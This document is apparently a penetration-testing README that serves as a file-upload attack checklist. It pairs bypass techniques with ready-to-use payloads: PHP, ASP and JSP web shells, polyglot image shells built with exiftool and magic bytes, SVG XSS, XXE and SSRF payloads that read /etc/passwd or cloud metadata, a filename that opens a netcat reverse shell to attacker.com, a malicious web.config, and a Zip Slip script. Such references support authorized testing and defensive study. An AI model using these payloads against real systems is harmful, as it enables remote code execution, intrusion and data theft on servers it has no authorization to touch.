# File Upload checklist
File Upload checklist For Penetration test and Red Team


## Introduction & OWASP Definition of the Vulnerability

According to OWASP, an **Unrestricted File Upload** vulnerability happens when a web application accepts user-uploaded files without proper validation or restrictions. Weak controls over the **file extension, MIME type, content, magic bytes, size, metadata, processing, or storage location** may lead to serious security risks such as **RCE, XSS, SSRF, XXE, DoS, information disclosure**, or full system compromise.

OWASP highlights that secure file uploads require **full-spectrum validation**, not only checking the file extension or client-side restrictions.

---

## Core Notes Before Testing File Upload Functionality

* Each application has its **own unique upload flow**. Before testing, the tester must understand how the system receives, processes, validates, and stores uploaded files.

* To identify a file upload vulnerability, map the entire upload process:

  1. **Where is the file stored?** (local disk, temp folder, database, CDN, cloud storage, etc.)
  2. **Is the file stored permanently or only temporarily processed?**
  3. **Is the uploaded file accessible?**

     * Direct public URL
     * Token-based URL
     * Internal-only path
     * Served through another backend route

* The most important rule in file upload pentesting:
  **You must know where the uploaded file ends up and whether it is accessible or executable.**

* Without determining the final file path or URL, even a successful upload cannot be exploited.

* Sometimes the file is not publicly reachable but is **processed internally** (ImageMagick, FFmpeg, ExifTool, OCR, AV scanners, etc.), which introduces additional attack vectors.

* File access may not be straightforward:

  * Renamed automatically
  * Stored in hashed directories
  * Extracted from an archive
  * Re-uploaded to CDN
  * Served via an API endpoint
  * Assigned a UUID or timestamp-based name
  * Accessible only through POST requests

* Fully understanding the **upload flow** is the key to finding bypasses and exploitation opportunities.

---

# File Upload Pentesting Checklist

A comprehensive checklist for pentesting file upload functionality in web applications.

## Table of Contents
- [Information Gathering](#information-gathering)
- [Extension-Based Bypasses](#extension-based-bypasses)
- [Content-Type Bypasses](#content-type-bypasses)
- [Magic Bytes & File Signature](#magic-bytes--file-signature)
- [File Name Manipulation](#file-name-manipulation)
- [Exploitation Techniques](#exploitation-techniques)
- [Server Configuration Attacks](#server-configuration-attacks)
- [Advanced Attacks](#advanced-attacks)
- [Tools](#tools)

---

## Information Gathering

- [ ] Identify upload functionality locations
- [ ] Determine allowed file extensions
- [ ] Check file size limitations
- [ ] Identify upload directory structure
- [ ] Determine if files are accessible directly or via tokenized URLs
- [ ] Check if uploaded files are processed server-side
- [ ] Identify web server type (Apache, IIS, Nginx)
- [ ] Determine backend technology (PHP, ASP.NET, JSP, etc.)
- [ ] Check for client-side validation
- [ ] Analyze server responses for information disclosure

---

## Extension-Based Bypasses

### Alternative Extensions
- [ ] Try PHP alternatives: `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phps`, `.phar`, `.pgif`, `.inc`, `.shtml`
- [ ] Try ASP alternatives: `.asp`, `.aspx`, `.cer`, `.asa`, `.asax`
- [ ] Try JSP alternatives: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
- [ ] Try ColdFusion: `.cfm`, `.cfml`, `.cfc`, `.dbm`
- [ ] Try executable extensions: `.exe`, `.sh`, `.bat`, `.cmd`

### Case Manipulation
- [ ] Mixed case: `.pHp`, `.PhP`, `.PHP`, `.aSp`, `.AsP`
- [ ] Random capitalization: `.pHP5`, `.PhAr`, `.AsPx`

### Double Extensions
- [ ] Try: `file.jpg.php`
- [ ] Try: `file.php.jpg`
- [ ] Try: `file.php.blah123jpg`

### Null Byte Injection
- [ ] Try: `file.php%00.jpg`
- [ ] Try: `file.php%00.png`
- [ ] Try: `file.php\x00.jpg`
- [ ] Try: `file.php%00`
- [ ] Try hex manipulation: upload as `file.phpD.jpg`, change `D` (0x44) to `0x00` in hex

### Delimiter-Based Bypasses
- [ ] Try: `file.php%0a.jpg`
- [ ] Try: `file.php\n.jpg`
- [ ] Try: `file.php\u000a.jpg`
- [ ] Try: `file.php\u560a.jpg`
- [ ] Try: `file.php#.jpg`
- [ ] Try: `file.php%23.jpg`
- [ ] Try: `file.php\u003b.jpg`
- [ ] Try: `file.php;.jpg`
- [ ] Try: `file.php%20`
- [ ] Try: `file.php%0d%0a.jpg`

### Special Character Bypasses
- [ ] Windows trailing dot: `file.php.`
- [ ] Windows trailing space: `file.php `
- [ ] Multiple dots: `file.php.....`
- [ ] Trailing slash: `file.php/`
- [ ] Trailing backslash: `file.php.\`
- [ ] Just extension: `file.`
- [ ] No extension: `.html`

### Homographic Characters
- [ ] Test homoglyphs using: https://www.irongeek.com/homoglyph-attack-generator.php
- [ ] Example: `file.Php` (where P is a different Unicode character)

### Windows 8.3 Short Name
- [ ] Try: `SHELL~1.ASP` (for `shell.aspx`)
- [ ] Test other 8.3 notation variations

### NTFS Alternate Data Stream (Windows Only)
- [ ] Try: `file.asax:.jpg`
- [ ] Try: `file.asp::$data`
- [ ] Try: `file.asp::$data.`

---

## Content-Type Bypasses

- [ ] Change `Content-Type: application/x-php` to `Content-Type: image/png`
- [ ] Change `Content-Type: application/x-php` to `Content-Type: image/gif`
- [ ] Change `Content-Type: application/x-php` to `Content-Type: image/jpg`
- [ ] Change `Content-Type: application/x-php` to `Content-Type: image/jpeg`
- [ ] Change to: `Content-Type: application/octet-stream`
- [ ] Test multiple Content-Type headers
- [ ] Remove Content-Type header completely

---

## Magic Bytes & File Signature

### Add Magic Bytes to Malicious Files
- [ ] GIF: `GIF89a;` or `GIF87a;`
- [ ] PNG: `\x89\x50\x4E\x47\x0D\x0A\x1A\x0A`
- [ ] JPEG: `\xFF\xD8\xFF\xDB` or `\xFF\xD8\xFF\xE0`
- [ ] PDF: `%PDF-`
- [ ] ZIP: `PK\x03\x04`
- [ ] TAR: `\x75\x73\x74\x61\x72\x00\x30\x30`
- [ ] XML: `<?xml`

### Example Payload with Magic Bytes
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### Image with Embedded Payload
- [ ] Use ExifTool to inject payload in metadata:
```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
```
- [ ] Rename to: `image.php.jpg`
- [ ] Test with BMP files using `bmp.pl` tool
- [ ] Create polyglot files (valid image + valid script)

### PHP GD Library Bypass
- [ ] Upload image, download processed version
- [ ] Check for: `CREATOR: gd-jpeg v1.0 (using IJG JPEG v62)`
- [ ] Find unchanged portions pre/post compression
- [ ] Inject payload in persistent sections
- [ ] Test with different image formats (JPG, PNG, GIF)

---

## File Name Manipulation

### Path Traversal
- [ ] Try: `../../../etc/passwd`
- [ ] Try: `..\..\..\..\windows\win.ini`
- [ ] Try: `....//....//....//etc/passwd`
- [ ] Try: `..%2F..%2F..%2Fetc%2Fpasswd`
- [ ] Try: `..%252F..%252F..%252Fetc%252Fpasswd`
- [ ] Try overwriting files: `../../../logo.png`
- [ ] Try: `../../filename.png`

### SQL Injection in Filename
- [ ] Try: `'sleep(10).jpg`
- [ ] Try: `sleep(10)-- -.jpg`
- [ ] Try: `file' OR '1'='1.jpg`
- [ ] Try: `file'; DROP TABLE users--.jpg`

### Command Injection in Filename
- [ ] Try: `file;sleep 10;.jpg`
- [ ] Try: `file$(whoami).jpg`
- [ ] Try: ``file`whoami`.jpg``
- [ ] Try: `file|whoami|.jpg`
- [ ] Try: `file||whoami||.jpg`
- [ ] Try: `file&&whoami&&.jpg`
- [ ] Try: `file;nc -e /bin/sh attacker.com 4444;.jpg`

### XSS in Filename
- [ ] Try: `<script>alert(1)</script>.jpg`
- [ ] Try: `<svg onload=alert(1)>.jpg`
- [ ] Try: `<img src=x onerror=alert(1)>.jpg`
- [ ] Try: `"><script>alert(document.domain)</script>.jpg`

### Special Filename Attacks
- [ ] Encoded filename: URL encoding, Unicode encoding
- [ ] Right-to-Left Override (RTLO): `file‮gpj.php` (displays as `file.php.jpg`)
- [ ] Very long filename (potential buffer overflow)
- [ ] Filename with your IP address
- [ ] Filename with newlines: `file\n.jpg`
- [ ] Filename with carriage returns: `file\r.jpg`

---

## Exploitation Techniques

### Remote Code Execution (RCE)

#### Web Shells
- [ ] Upload PHP shell: `<?php system($_GET['cmd']); ?>`
- [ ] Minimal PHP shell: `<?=`$_GET[x]`?>`
- [ ] ASP shell: `<%eval request("cmd")%>`
- [ ] JSP shell: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`

#### Server-Side Script Upload
- [ ] Upload `.php`, `.asp`, `.aspx`, `.jsp` files
- [ ] Test alternative executable extensions
- [ ] Combine with extension bypass techniques
- [ ] Test if uploaded files are executed in-place

### Cross-Site Scripting (XSS)

#### SVG-Based XSS
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("XSS");
   </script>
</svg>
```

#### HTML-Based XSS
```html
<html>
<body>
<script>alert(document.domain)</script>
</body>
</html>
```

- [ ] Upload SVG with XSS payload
- [ ] Upload HTML with XSS payload
- [ ] Test XSS in filename
- [ ] Test XSS in metadata/EXIF data

### XML External Entity (XXE)

#### SVG XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

- [ ] Test XXE via SVG upload
- [ ] Test XXE via XML upload
- [ ] Test XXE via Excel file (.xlsx)
- [ ] Test XXE via Office documents (DOCX, PPTX)
- [ ] Try external entity for LFI
- [ ] Try external entity for SSRF

### Server-Side Request Forgery (SSRF)

#### HTML SSRF
```html
<html>
<body>
<iframe src="http://169.254.169.254/latest/meta-data"></iframe>
</body>
</html>
```

#### SVG SSRF
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://internal-server/secret"> ]>
<svg>&xxe;</svg>
```

- [ ] Upload HTML with SSRF payload
- [ ] Upload SVG with SSRF payload
- [ ] Test SSRF via XML upload
- [ ] Test SSRF via PDF upload
- [ ] Test SSRF via Office documents
- [ ] Test file upload via URL (if supported)
- [ ] Target internal services: `http://127.0.0.1`, `http://localhost`
- [ ] Target cloud metadata: `http://169.254.169.254/latest/meta-data`

### Open Redirect

#### SVG Open Redirect
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://attacker.com'" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
```

#### HTML Open Redirect
```html
<html>
<head>
<meta http-equiv="refresh" content="0; url=https://attacker.com">
</head>
</html>
```

- [ ] Upload SVG with redirect
- [ ] Upload HTML with redirect
- [ ] Test if application follows redirects

### CSV Injection
- [ ] Upload CSV with formula injection:
```
=cmd|'/c calc'!A1
=1+1+cmd|'/c calc'!A1
@SUM(1+1)*cmd|'/c calc'!A1
+cmd|'/c calc'!A1
-cmd|'/c calc'!A1
```

---

## Server Configuration Attacks

### Apache .htaccess Upload
```apache
AddType application/x-httpd-php .evil
```
- [ ] Upload `.htaccess` to define new PHP extensions
- [ ] Check if `AllowOverride` is enabled
- [ ] Upload file with custom extension (`.evil`)
- [ ] Test execution

### IIS web.config Upload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.write("-"&"->")
Set objShell = CreateObject("WScript.Shell")
objShell.Exec("cmd.exe /c whoami")
Response.write("<!-"&"-")
%>
-->
```
- [ ] Upload `web.config` file
- [ ] Test ASP code execution
- [ ] Try XSS via web.config
- [ ] Try RCE via web.config

### PHP Configuration Files
- [ ] Try uploading: `.user.ini`
- [ ] Try uploading: `php.ini`
- [ ] Modify PHP settings (e.g., `auto_prepend_file`)

---

## Advanced Attacks

### Zip Slip Attack
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../shell.php', '<?php system($_GET["cmd"]); ?>')
    z.close()
    with open('malicious.zip', 'wb') as zip_file:
        zip_file.write(f.getvalue())

build_zip()
```
- [ ] Create malicious zip with path traversal
- [ ] Upload and check if extracted outside intended directory
- [ ] Try variations: `../../`, `..\..\\`
- [ ] Check for arbitrary file write

### Pixel Flood Attack (DoS)
- [ ] Create image with massive dimensions (64250x64550px)
- [ ] Use: https://www.resizepixel.com
- [ ] Upload and observe server response time
- [ ] Check if server becomes unresponsive
- [ ] Verify DoS from another device

### Large File DoS
- [ ] Create file with large size (500MB+)
- [ ] Upload and monitor server resources
- [ ] Check disk space consumption
- [ ] Test if application has file size limits

### Race Condition
- [ ] Upload file multiple times simultaneously
- [ ] Try accessing file during processing
- [ ] Upload malicious file, access before validation completes
- [ ] Use Turbo Intruder or custom scripts

### Image Tragick (CVE-2016-3714)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|whoami")'
pop graphic-context
```
- [ ] Test if ImageMagick is used
- [ ] Upload malicious image file
- [ ] Test for command injection
- [ ] Check ImageMagick version

### FFmpeg Exploit
- [ ] Detect if FFmpeg processes uploads
- [ ] Test for local file disclosure
- [ ] Test for SSRF via FFmpeg
- [ ] Use FFmpeg HLS vulnerability

### ExifTool RCE (CVE-2021-22204)
- [ ] Check if ExifTool is used (versions 7.44-12.23)
- [ ] Create malicious DjVu file
- [ ] Upload and trigger processing
- [ ] Test command execution

### PHP GD Bypass (Detailed)
- [ ] Upload test image
- [ ] Download processed image
- [ ] Check for GD library signatures
- [ ] Find persistent image sections
- [ ] Inject PHP code in persistent sections
- [ ] Re-upload and test execution

### DLL Hijacking (Thick Client)
- [ ] Upload malicious DLL
- [ ] Place in application directory
- [ ] Test if loaded by application

### Metadata Leakage
- [ ] Upload image with EXIF data
- [ ] Use: http://exif.regex.info/exif.cgi
- [ ] Check for sensitive information:
  - GPS coordinates
  - Camera model
  - Software version
  - Author information
  - Timestamps
- [ ] Test with: https://github.com/ianare/exif-samples

---

## Content Validation Bypass

### Client-Side Validation
- [ ] Disable JavaScript
- [ ] Modify JavaScript code
- [ ] Intercept and modify request
- [ ] Use browser developer tools

### File Size Restrictions
- [ ] Use minimal PHP shell: `<?=`$_GET[x]`?>`
- [ ] Compress payload
- [ ] Split into multiple files

### MIME Type Validation
- [ ] Check if validated on client or server
- [ ] Modify Content-Type header
- [ ] Test if magic bytes are checked

### Regex Implementation Flaws
- [ ] Test if extension anywhere in filename: `hellopng.php`
- [ ] Test if only checks end: `hello.php.asdfpng`
- [ ] Test case sensitivity
- [ ] Test with special characters

---

## Testing Workflow

### Initial Testing
1. [ ] Upload legitimate file (e.g., `.jpg`)
2. [ ] Note the upload path/URL
3. [ ] Check if file is accessible
4. [ ] Identify validation mechanisms

### Extension Bypass Testing
5. [ ] Try alternative extensions
6. [ ] Try double extensions
7. [ ] Try null byte injection
8. [ ] Try case manipulation
9. [ ] Try special characters

### Content Bypass Testing
10. [ ] Change Content-Type
11. [ ] Add magic bytes
12. [ ] Test polyglot files
13. [ ] Embed payload in metadata

### Exploitation Testing
14. [ ] Test for RCE
15. [ ] Test for XSS
16. [ ] Test for XXE
17. [ ] Test for SSRF
18. [ ] Test for path traversal

### Configuration Testing
19. [ ] Try `.htaccess` upload
20. [ ] Try `web.config` upload
21. [ ] Try configuration file overwrite

### Advanced Testing
22. [ ] Test for race conditions
23. [ ] Test for zip slip
24. [ ] Test for DoS attacks
25. [ ] Test for metadata leakage

---

## Tools

### Upload Scanners
- **Burp Suite** - Intercept and modify requests
- **Fuxploider** - Automated file upload scanner
- **Upload Scanner** (Burp Extension) - Automated testing
- **Wfuzz** - Fuzzing tool for extensions

### File Analysis
- **ExifTool** - Read/write metadata
- **file** (Linux command) - Identify file type
- **hexeditor** - View/edit hex
- **binwalk** - Analyze firmware/files

### Payload Generation
- **Weevely** - PHP web shell generator
- **msfvenom** - Generate various payloads
- **commix** - Command injection tool

### Exploitation
- **ImageTragick Exploit** - CVE-2016-3714
- **ExifTool Exploit** - CVE-2021-22204
- **FFmpeg Exploits** - Various CVEs

### Lists & Wordlists
- **SecLists** - Extension lists, payloads
  - https://github.com/danielmiessler/SecLists
- **PayloadsAllTheThings** - File upload payloads
  - https://github.com/swisskyrepo/PayloadsAllTheThings
- **Upload Bypass** - Extension wordlist
  - https://github.com/EmadYaY/Upload_Bypass

---

## References

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-upload)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

## Common File Extensions by Impact

### Remote Code Execution
- **PHP**: `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.pht`, `.phps`, `.phar`, `.pgif`, `.inc`, `.shtml`
- **ASP**: `.asp`, `.aspx`, `.cer`, `.asa`, `.asax`, `.ascx`, `.ashx`, `.asmx`, `.axd`
- **JSP**: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
- **ColdFusion**: `.cfm`, `.cfml`, `.cfc`, `.dbm`
- **Perl**: `.pl`, `.pm`, `.cgi`
- **Python**: `.py`, `.pyc`, `.pyo`
- **Ruby**: `.rb`

### Stored XSS / Client-Side Attacks
- **SVG**: `.svg`
- **HTML**: `.html`, `.htm`, `.xhtml`
- **XML**: `.xml`
- **Flash**: `.swf`

### XXE / SSRF
- **SVG**: `.svg`
- **XML**: `.xml`
- **PDF**: `.pdf`
- **Office**: `.docx`, `.xlsx`, `.pptx`

### Other Vulnerabilities
- **CSV Injection**: `.csv`
- **LFI**: `.zip`, `.tar`, `.gz`
- **SSRF**: `.avi`, `.gif`, `.png`, `.jpg`

---

## Quick Reference Commands

### ExifTool Injection
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### Null Byte in Filename (URL Encoded)
```
filename.php%00.jpg
```

### Magic Bytes Examples
```bash
# GIF
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.php

# PNG (hex)
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.php
```

### Check File Type
```bash
file uploaded_file.jpg
hexdump -C uploaded_file.jpg | head
```

---

**Note**: Always ensure you have proper authorization before conducting security testing. Unauthorized testing is illegal and unethical.

**Contribution**:
If you want to contribute to my Repository, please specify exactly what you added to the code and why, and make sure you perform multiple tests before submitting the merge request.

© 2025 Arganex-Emad. All Rights Reserved.

This project is licensed under the [MIT License](https://github.com/EmadYaY/File_Upload_checklist/blob/main/LICENSE).
You are free to use, modify, and distribute this project,
provided that the original license terms are respected.

For full details, see the LICENSE file.
